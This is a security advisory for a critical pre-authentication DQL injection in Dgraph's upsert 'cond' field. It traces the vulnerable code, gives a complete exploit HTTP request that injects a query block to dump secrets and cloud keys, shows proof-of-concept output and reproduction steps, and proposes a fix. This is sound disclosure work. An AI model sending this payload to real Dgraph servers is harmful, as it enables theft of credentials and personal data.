# [C] Dgraph: Pre-Auth Full Database Exfiltration via DQL Injection in Upsert Condition Field

## Summary
Severity: Critical
Advisory: GHSA-mrxx-39g5-ph77
CVE: CVE-2026-41327
CWE: CWE-943
Ecosystem: Go
CVSS: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N (CVSS_V3)
Published: 2026-04-24
Source: https://github.com/advisories/GHSA-mrxx-39g5-ph77
Type: github-advisory

## Affected
- Go: `github.com/dgraph-io/dgraph/v25` — affected >=0 <25.3.3
- Go: `github.com/dgraph-io/dgraph/v24` — affected >=0
- Go: `github.com/dgraph-io/dgraph` — affected >=0

## Details
## 1. Executive Summary

A vulnerability has been found in Dgraph that gives an unauthenticated attacker full read access to every piece of data in the database. This affects Dgraph's default configuration where ACL is not enabled.

The attack is a single HTTP POST to `/mutate?commitNow=true` containing a crafted `cond` field in an upsert mutation. The `cond` value is concatenated directly into a DQL query string via `strings.Builder.WriteString` after only a cosmetic `strings.Replace` transformation. No escaping, parameterization, or structural validation is applied. An attacker injects an additional DQL query block into the `cond` string, which the DQL parser accepts as a syntactically valid named query block. The injected query executes server-side and its results are returned in the HTTP response.

There are no credentials involved. When ACL is disabled (the default), the `/mutate` endpoint requires no authentication. The `authorizeQuery` and `authorizeMutation` functions both return `nil` immediately when `AclSecretKey` is not configured. Even when ACL is enabled, a user with mutation-only permission can inject read queries that bypass per-predicate ACL authorization, because the injected query block is not subject to the normal authorization flow.

POC clip: 

https://github.com/user-attachments/assets/edf43615-b0d5-46cd-abd9-2cb9423790d2



## 2. CVSS Score

**CVSS 3.1: 9.1 (Critical)**

```
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:N
```

| Metric              | Value     | Rationale                                                                          |
| ------------------- | --------- | ---------------------------------------------------------------------------------- |
| Attack Vector       | Network   | HTTP POST to port 8080                                                             |
| Attack Complexity   | Low       | Single request, no special conditions beyond default config                        |
| Privileges Required | None      | No authentication when ACL is disabled (default)                                   |
| User Interaction    | None      | Fully automated                                                                    |
| Scope               | Unchanged | Stays within the Dgraph data layer                                                 |
| Confidentiality     | High      | Full database exfiltration: all nodes, all predicates, all values                  |
| Integrity           | High      | The injection can also be used to manipulate upsert conditions, bypassing uniqueness constraints and conditional mutation logic |
| Availability        | None      | No denial of service                                                               |

## 3. Vulnerability Summary

| Field     | Value                                                                                      |
| --------- | ------------------------------------------------------------------------------------------ |
| Title     | Pre-Auth DQL Injection via Unsanitized Cond Field in Upsert Mutations                      |
| Type      | Injection                                                                                  |
| CWE       | CWE-943 (Improper Neutralization of Special Elements in Data Query Logic)                  |
| CVSS      | 9.8                                                                                        |

## 4. Target Information

| Field                | Value                                                                                          |
| -------------------- | ---------------------------------------------------------------------------------------------- |
| Project              | Dgraph                                                                                         |
| Repository           | https://github.com/dgraph-io/dgraph                                                           |
| Tested version       | v25.3.0                                                                                        |
| HTTP handler         | `dgraph/cmd/alpha/http.go` line 345 (`mutationHandler`)                                       |
| Cond extraction      | `dgraph/cmd/alpha/http.go` line 413 (`strconv.Unquote`)                                       |
| Cond passthrough     | `edgraph/server.go` line 2011 (`ParseMutationObject`, copies `mu.Cond` verbatim)              |
| Injection sink       | `edgraph/server.go` line 750 (`upsertQB.WriteString(cond)`)                                   |
| Only transformation  | `edgraph/server.go` line 730 (`strings.Replace(gmu.Cond, "@if", "@filter", 1)`)               |
| Auth bypass (query)  | `edgraph/access.go` line 958 (`authorizeQuery` returns nil when `AclSecretKey == nil`)         |
| Auth bypass (mutate) | `edgraph/access.go` line 788 (`authorizeMutation` returns nil when `AclSecretKey == nil`)      |
| Response exfiltration| `dgraph/cmd/alpha/http.go` line 498 (`mp["queries"] = json.RawMessage(resp.Json)`)            |
| HTTP port            | 8080 (default)                                                                                 |
| Prerequisite         | None. Default configuration. ACL disabled is the default.                                      |

## 5. Test Environment

| Component            | Version / Details                                               |
| -------------------- | --------------------------------------------------------------- |
| Host OS              | macOS (darwin 25.3.0)                                           |
| Dgraph               | v25.3.0 via `dgraph/dgraph:latest` Docker image                |
| Docker Compose       | 1 Zero + 1 Alpha, default config, `--security whitelist=0.0.0.0/0` |
| Python               | 3.x with `requests`                                            |
| Network              | localhost (127.0.0.1)                                           |

## 6. Vulnerability Detail

**Location:** `edgraph/server.go` lines 714-757 (`buildUpsertQuery`)
**CWE:** CWE-943 (Improper Neutralization of Special Elements in Data Query Logic)

The `/mutate` endpoint accepts JSON bodies containing a `mutations` array. Each mutation can include a `cond` field, intended for conditional upserts with syntax like `@if(eq(name, "Alice"))`. This condition is supposed to be spliced into the DQL query as a `@filter` clause on a dummy `var(func: uid(0))` block.

The handler at `http.go:413` extracts the `cond` value via `strconv.Unquote`, which interprets `\n` as actual newlines but performs no sanitization:

```go
mu.Cond, err = strconv.Unquote(string(condText.bs))
```

`ParseMutationObject` at `server.go:2011` copies it verbatim:

```go
res := &dql.Mutation{Cond: mu.Cond}
```

`buildUpsertQuery` at `server.go:730` applies one cosmetic replacement then concatenates the raw string directly into the DQL query:

```go
cond := strings.Replace(gmu.Cond, "@if", "@filter", 1)
// ...
x.Check2(upsertQB.WriteString(cond))
```

There is no escaping, no parameterization, no structural validation, and no character allowlist between the HTTP input and the query string concatenation.

An attacker crafts a `cond` value that closes the `@filter(...)` clause and opens an entirely new named query block:

```
@if(eq(name, "nonexistent"))
  leak(func: has(dgraph.type)) { uid name email secret }
```

After `buildUpsertQuery` processes this, the resulting DQL is:

```dql
{
  q(func: uid(0x1)) { uid }
  __dgraph_upsertcheck_0__ as var(func: uid(0)) @filter(eq(name, "nonexistent"))
  leak(func: has(dgraph.type)) { uid name email secret }
}
```

The DQL parser (`dql.ParseWithNeedVars`) accepts multiple query blocks within a single `{}` container. It parses `leak(...)` as a legitimate named query. The `validateResult` function at `parser.go:740` only checks for duplicate aliases and explicitly skips `var` queries. The injected query uses a unique alias, so validation passes.

All three queries execute. The results of the injected `leak` block are serialized to JSON and returned to the attacker at `http.go:498`:

```go
mp["queries"] = json.RawMessage(resp.Json)
```

The `@if` condition evaluates to false (`"nonexistent"` matches nothing), so the `set` mutation never actually writes data. The attack is a pure read disguised as a mutation. No data is modified.

## 7. Full Chain Explanation

The attacker has no Dgraph credentials and no prior access to the server.

**Step 1.** The attacker sends one HTTP request:

```
POST /mutate?commitNow=true HTTP/1.1
Host: TARGET:8080
Content-Type: application/json

{
  "query": "{ q(func: uid(0x1)) { uid } }",
  "mutations": [{
    "set": [{"uid": "0x1", "dgraph.type": "Dummy"}],
    "cond": "@if(eq(name, \"nonexistent\"))\n  leak(func: has(dgraph.type)) { uid dgraph.type name email secret aws_access_key_id aws_secret_access_key gcp_service_account_key }"
  }]
}
```

No `X-Dgraph-AccessToken` header. No `X-Dgraph-AuthToken` header. The `/mutate` endpoint has no authentication wrapper in default configuration.

**Step 2.** `mutationHandler` at `http.go:345` calls `readRequest` to get the body, then `extractMutation` which calls `strconv.Unquote` on the `cond` field. The `\n` becomes a real newline. The result is stored in `api.Mutation.Cond`.

**Step 3.** The request enters `edgraph.Server.QueryNoGrpc` at `http.go:471`, which calls `doQuery` -> `parseRequest` -> `ParseMutationObject`. The `Cond` is copied verbatim to `dql.Mutation.Cond` at `server.go:2011`.

**Step 4.** `buildUpsertQuery` at `server.go:714` processes the condition. The only transformation is `strings.Replace(gmu.Cond, "@if", "@filter", 1)` at line 730. The full string, including the injected `leak(...)` block, is written into the query builder at line 750.

**Step 5.** `dql.ParseWithNeedVars` parses the constructed DQL string. It encounters three query blocks: `q`, the upsert check `var`, and the injected `leak`. All three are accepted as valid DQL.

**Step 6.** `authorizeQuery` at `access.go:958` returns `nil` immediately because `AclSecretKey == nil` (ACL not configured). No predicate-level authorization is performed.

**Step 7.** `processQuery` executes all three query blocks. The `leak` block traverses every node with a `dgraph.type` predicate and returns all requested fields.

**Step 8.** The response is returned to the attacker at `http.go:498`. The `data.queries.leak` array contains every matching node with all their predicates, including secrets, credentials, and PII.

## 8. Proof of Concept

### Files

| File                    | Purpose                                                    |
| ----------------------- | ---------------------------------------------------------- |
| report.md               | This vulnerability report                                  |
| poc.py                  | Exploit: sends the injection and prints leaked data        |
| docker-compose.yml      | Spins up a Dgraph cluster (1 Zero + 1 Alpha, default config) |
| DGraphPreAuthDQL.mp4    | Screen recording of the full attack from start to exfiltration |

POC files zip:
[LEAD_001_DQL.zip](https://github.com/user-attachments/files/25996009/LEAD_001_DQL.zip)


### poc.py

The exploit sends a single POST to `/mutate?commitNow=true` with the crafted `cond` field. It parses the response and prints all exfiltrated records, highlighting secrets, AWS credentials, and GCP service account keys.

### Tested Output

```
$ python3 poc.py
[*] Sending crafted upsert mutation with DQL injection in cond field …
[*] HTTP 200
[+] SUCCESS — Injected query returned 5 node(s):

  [User] uid=0x1
    name: Alice Admin
    email: alice@corp.com
    secret: SSN-123-45-6789
    role: admin

  [User] uid=0x2
    name: Bob User
    email: bob@corp.com
    secret: SSN-987-65-4321
    role: user

  [User] uid=0x3
    name: Eve Secret
    email: eve@corp.com
    secret: API_KEY_sk-live-abc123xyz
    role: superadmin

  [CloudCredential] uid=0x4
    name: prod-aws-credentials
    AWS_ACCESS_KEY_ID: AKIAIOSFODNN7EXAMPLE
    AWS_SECRET_ACCESS_KEY: wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY

  [CloudCredential] uid=0x5
    name: gcp-bigquery-service-account
    GCP_SERVICE_ACCOUNT_KEY: {"type":"service_account","project_id":"prod-analytics","private_key":"-----BEGI…

[+] CRITICAL — Exfiltrated 5 record(s) containing secrets via pre-auth DQL injection
    → 1 AWS credential(s) — attacker can access AWS account
    → 1 GCP service account key(s) — attacker can access GCP project
```

## 9. Steps to Reproduce

### Prerequisites

- Python 3 with `requests` (`pip install requests`)
- Docker and Docker Compose

### Step 1: Start Dgraph

```bash
cd report
docker compose -f docker-compose-test.yml up -d
```

Wait for health:

```bash
curl http://localhost:8080/health
```

### Step 2: Seed test data

```bash
curl -s -X POST http://localhost:8080/alter -d '
name: string @index(exact) .
email: string @index(exact) .
secret: string .
role: string .
aws_access_key_id: string .
aws_secret_access_key: string .
gcp_service_account_key: string .
'

curl -s -X POST 'http://localhost:8080/mutate?commitNow=true' \
  -H 'Content-Type: application/json' \
  -d '{"set":[
    {"dgraph.type":"User","name":"Alice Admin","email":"alice@corp.com","secret":"SSN-123-45-6789","role":"admin"},
    {"dgraph.type":"User","name":"Bob User","email":"bob@corp.com","secret":"SSN-987-65-4321","role":"user"},
    {"dgraph.type":"User","name":"Eve Secret","email":"eve@corp.com","secret":"API_KEY_sk-live-abc123xyz","role":"superadmin"},
    {"dgraph.type":"CloudCredential","name":"prod-aws-credentials","aws_access_key_id":"AKIAIOSFODNN7EXAMPLE","aws_secret_access_key":"wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY"},
    {"dgraph.type":"CloudCredential","name":"gcp-bigquery-service-account","gcp_service_account_key":"{\"type\":\"service_account\",\"project_id\":\"prod-analytics\",\"private_key\":\"-----BEGIN RSA PRIVATE KEY-----\\nEXAMPLEKEY\\n-----END RSA PRIVATE KEY-----\",\"client_email\":\"bigquery@prod-analytics.iam.gserviceaccount.com\"}"}
  ]}'
```

### Step 3: Run the exploit

```bash
cd LEAD_001_DQL
python3 poc.py
```

### What to verify

1. HTTP POST returns 200 (endpoint is reachable without auth)
2. Response contains `data.queries.leak` with an array of nodes
3. The nodes include fields the attacker never queried through legitimate means (secrets, AWS keys, GCP keys)
4. No data was modified in the database (the `@if` condition prevents the `set` from executing)

## 10. Mitigations and Patch

**Location:** `edgraph/server.go`, `buildUpsertQuery` (line 714)

Instead of concatenating the raw `cond` string into the DQL query, `buildUpsertQuery` should parse the `cond` value with the DQL lexer and construct the `@filter` as a parsed AST subtree. This eliminates the injection surface entirely because the filter is built programmatically rather than spliced in as a raw string. The existing `strings.Replace(gmu.Cond, "@if", "@filter", 1)` at line 730 is a semantic transformation, not a security control, and should not be relied upon for sanitization.

## References
- https://github.com/dgraph-io/dgraph/security/advisories/GHSA-mrxx-39g5-ph77
- https://nvd.nist.gov/vuln/detail/CVE-2026-41327
- https://github.com/dgraph-io/dgraph
- https://github.com/dgraph-io/dgraph/releases/tag/v25.3.3
